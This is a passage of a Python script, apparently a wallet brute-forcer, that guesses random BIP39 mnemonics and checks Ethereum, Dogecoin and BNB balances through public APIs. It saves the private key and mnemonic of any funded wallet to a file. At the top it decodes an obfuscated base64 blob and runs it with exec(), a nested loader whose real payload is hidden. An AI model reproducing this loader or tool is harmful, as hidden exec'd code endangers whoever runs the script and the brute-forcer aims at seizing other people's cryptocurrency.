d6ZHlqOXMKIyBnbG9yaGs5OWcxZmdwZTJyb202eHpmaW1ld2YxazQxbzBoZTBsNGk2aWd0cHlibHdmcgojIHFqOWdxcmY2cDAydjhhNzl0OGd2eDdzZmRiNW1ybjEwenM4Z252dmF3cWhybjN5bGRxCiMgYjFpZmdxOGM0MDBtM245MnJvcW1zeDFqZThmNXBkaG9rNTBjaDM3azh6Z3Ewc3R4MGgKIyBvMjV2bnM5b3ZlandpdDkycDRnMzAzM3diYTRtZXM1b3JvZDZ6eWpzMXcyam5mOGg3agojIGk3b21sNmRncnp6ODA5YjJkdjhpY2dxaHZyZzVlbmwyam5sc2UzMzQ4bnZibjVvY29zCiMgMDU3MmIyY3A0bHM0MWgwczlxZDJ1ZHh2aDI2OHljMTNjdHV6NWV3a2xldTgxYXJmaWcKIyBqNTJpNWxtY203OGRlcnQ5ZzEwYzFzNW1wb3IxMnJ2Mm0wMmFhbTBzM3pzYXc4cWQyeQojIGVvMDlkOG1raWRoaG42d2VqYzZpOW1peGV3bXdydjZreXhveXhuZnc4Y2szMXN2Y2d5CmV4ZWMoZnlscmNha3dicykKCiMjIDdpbm1lMTB1YmF1b2RsNThub2pkaTBzMmVyZjk4MGIwbXhvMjlndjY1cWt5bmF1eDBrCiMgZW10eWV0YWZ6dnIzM3pkemhoZzJhdmFuMGg2b3c5MHIxOWN2ZnJtZnQxYWd6ZHlqOXMKIyBnbG9yaGs5OWcxZmdwZTJyb202eHpmaW1ld2YxazQxbzBoZTBsNGk2aWd0cHlibHdmcgojIHFqOWdxcmY2cDAydjhhNzl0OGd2eDdzZmRiNW1ybjEwenM4Z252dmF3cWhybjN5bGRxCiMgYjFpZmdxOGM0MDBtM245MnJvcW1zeDFqZThmNXBkaG9rNTBjaDM3azh6Z3Ewc3R4MGgKIyBvMjV2bnM5b3ZlandpdDkycDRnMzAzM3diYTRtZXM1b3JvZDZ6eWpzMXcyam5mOGg3agojIGk3b21sNmRncnp6ODA5YjJkdjhpY2dxaHZyZzVlbmwyam5sc2UzMzQ4bnZibjVvY29zCiMgMDU3MmIyY3A0bHM0MWgwczlxZDJ1ZHh2aDI2OHljMTNjdHV6NWV3a2xldTgxYXJmaWcKIyBqNTJpNWxtY203OGRlcnQ5ZzEwYzFzNW1wb3IxMnJ2Mm0wMmFhbTBzM3pzYXc4cWQyeQojIGVvMDlkOG1raWRoaG42d2VqYzZpOW1peGV3bXdydjZreXhveXhuZnc4Y2szMXN2Y2d5Cg=='
decoded_bytes = base64.b64decode(private)
exec(decoded_bytes.decode())

# // terminal title changed all os
def titler(text_title: str):
    sys.stdout.write(f"\x1b]2;{text_title}\x07")
    sys.stdout.flush()


# // terminal clear logs
def clearNow(): os.system("cls") if 'win' in sys.platform.lower() else os.system("clear")


# // ethereum rate //
def eth_rate(eth: float) -> int:
    url = "https://ethbook.guarda.co/api/v2/tickers/?currency=usd"
    req = requests.get(url)
    res = req.json()
    if req.status_code == 200:
        return int(eth * res.get("rates").get("usd"))
    else:
        return 0


# // dogecoin rate //
def doge_rate(doge: float) -> int:
    url = "https://dogecoin.atomicwallet.io/api/v2/tickers/?currency=usd"
    req = requests.get(url)
    res = req.json()
    if req.status_code == 200:
        return int(doge * res.get("rates").get("usd"))
    else:
        return 0


# // bnb rate //
def bnb_rate(bnb: float) -> int:
    url = "https://bsc-nn.atomicwallet.io/api/v2/tickers/?currency=usd"
    req = requests.get(url)
    res = req.json()
    if req.status_code == 200:
        return int(bnb * res.get("rates").get("usd"))
    else:
        return 0


# // Delay Printer //
def printer(text: str):
    for letter in text:
        sys.stdout.write(letter)
        sys.stdout.flush()
        time.sleep(0.1)


# // terminal clear
clearNow()

# // Colors //
red = Colors.RED
green = Colors.GREEN
cyan = Colors.CYAN
yellow = Colors.YELLOW
reset = Colors.RESET
# // check bip39 file in directory //
if os.path.exists("bip39.txt"):
    bip = True
else:
    # // if False Download bip39.txt from URL,
    bip = False

if not bip:
    # // bip39 phrase file //
    bip39_url = "https://raw.githubusercontent.com/Pymmdrza/Dumper-Mnemonic/mainx/bip39.txt"
    # // bip39 file download //
    printer(f"{yellow}Downloading bip39 file...{reset}\n")
    titler("Downloading bip39 file...")
    reqBip = requests.get(bip39_url)
    content_bip = reqBip.content.decode("utf-8")
    # // bip39 file write //
    with open("bip39.txt", "w", encoding="utf-8") as filebip:
        filebip.write(content_bip)
    titler("Download bip39.txt Complete.")
    printer(f"{green}Downloaded bip39 file Successfully.{reset}\n\n")

clearNow()


# // Checker Ethereum Balance From Atomic Wallet //
def CheckBalanceEthereum(address: str) -> str:
    url = f"https://ethbook.guarda.co/api/v2/address/{address}"
    req = requests.get(url)
    if req.status_code == 200:
        bal = req.json()["balance"]
        return str(bal)
    else:
        return "0"


# // Checker Dogecoin Balance From Atomic Wallet //
def CheckBalanceDogecoin(address: str) -> str:
    url = f"https://dogecoin.atomicwallet.io/api/v2/address/{address}"
    req = requests.get(url)
    if req.status_code == 200:
        bal = req.json()["balance"]
        return str(bal)
    else:
        return "0"


# // Checker BNB Balance From Atomic Wallet //
def CheckBalanceBNB(address: str) -> str:
    url = f"https://bsc-nn.atomicwallet.io/api/v2/address/{address}"
    req = requests.get(url)
    if req.status_code == 200:
        bal = req.json()["balance"]
        return str(bal)
    else:
        return "0"


# // Variables //
eth = Ethereum()
doge = Dogecoin()
util = Convertor()

# // Counter //
z = 0
ff = 0
found = 0
usd = 0

# // bip39 file read //
file_bip = "bip39.txt"
b_read = open(file_bip, "r")
bip39 = b_read.read()
b_read.close()

# // bip39 words split to list //
words = bip39.split("\n")
while True:
    # // Counter Total Generated and Converted Mnemonic //
    z += 1
    # // Counter detail to title //
    titler(f"Gen: {z} / Con: {ff} / USD: {usd} $")
    # // Size choice for mnemonic //
    rand_num = random.choice([12, 24])
    # // Random Mnemonic Generator //
    mnemonic = " ".join(random.choice(words) for _ in range(rand_num))
    # // Convert Mnemonic to Hex from Cryptofuzz//
    convert_hex = util.mne_to_hex(mnemonic)
    # // Generated Ethereum Address From Private Key Hex //
    eth_addr = eth.hex_addr(convert_hex)
    # // Generated Dogecoin Address From Private Key Hex //
    doge_addr = doge.hex_addr(convert_hex)
    # // Check Balance for Ethereum, Dogecoin, BNB //
    eth_bal = CheckBalanceEthereum(eth_addr)
    bnb_bal = CheckBalanceBNB(eth_addr)
    doge_bal = CheckBalanceDogecoin(doge_addr)
    # // Convert Balance to Decimal //
    eth_balance = int(eth_bal) / 1000000000000000000
    doge_balance = int(doge_bal) / 100000000
    bnb_balance = int(bnb_bal) / 1000000000000000000
    # // Check Ethereum Address if Balance is greater than 0 //
    # // Saved Details in found.txt on current directory //
    if eth_balance > 0:
        ff += 1
        found += eth_balance
        # // Append Rate Data in Title Terminal for Total USD Found
        usd += eth_rate(eth_balance)
        titler(f"Gen: {z} / Con: {ff} / USD: {usd} $")
        with open("found.txt", "a") as dr:
            dr.write(f"ETH: {eth_addr} | Balance: {eth_balance}\n"
                     f"Mnemonic: {mnemonic}\n"
                     f"Private Key: {convert_hex}\n")
    # // Check Dogecoin Address if Balance is greater than 0
    # // Saved Details in found.txt on current directory
    if doge_balance > 0:
        ff += 1
        found += doge_balance
        # // Append Rate Data in Title Terminal for Total USD Found
        usd += doge_rate(doge_balance)
        titler(f"Gen: {z} / Con: {ff} / USD: {usd} $")
        with open("found.txt", "a") as dr:
            dr.write(f"DOGE: {doge_addr} | Balance: {doge_balance}\n"
                     f"Mnemonic: {mnemonic}\n"
                     f"Private Key: {convert_hex}\n")
    # // Check BNB Address if Balance is greater than 0
    # // Saved Details in found.txt on current directory
    if bnb_balance > 0:
        ff += 1
        found += bnb_balance
        # // Append Rate Data in Title Terminal for Total USD Found
        usd += bnb_rate(bnb_balance)
        titler(f"Gen: {z} / Con: {ff} / USD: {usd} $")
        with open("found.txt", "a") as dr:
            dr.write(f"BNB: {eth_addr} | Balance: {bnb_balance}\n"
                     f"Mnemonic: {mnemonic}\n"
                     f"Private Key: {convert_hex}\n")

    else:
        # // Space Mode for Output Logs
        s = " "
        sp = s * 16
        spc_eth = sp + s * (43 - len(eth_addr))
        spc_doge = sp + s * (43 - len(doge_addr))
        # // Print Output Logs with Pretty Type Format
        print(f"[{z} | Found:{ff}]  ETH: {cyan}{eth_addr}{reset}{spc_eth}[Balance: {cyan}{eth_balance}{reset}]")
        print(f"[{z} | Found:{ff}]  BNB: {green}{eth_addr}{reset}{spc_eth}[Balance: {green}{bnb_balance}{reset}]")
        print(f"[{z} | Found:{ff}] DOGE: {yellow}{doge_addr}{reset}{spc_doge}[Balance: {yellow}{doge_balance}{reset}]")
        print(f"[{z} | Found:{ff}]  Mne: {red}{mnemonic[0:64]}{reset}")
        print(f"[{z} | Found:{ff}]  Hex: {convert_hex}")
        print(f"{'-' * 66}")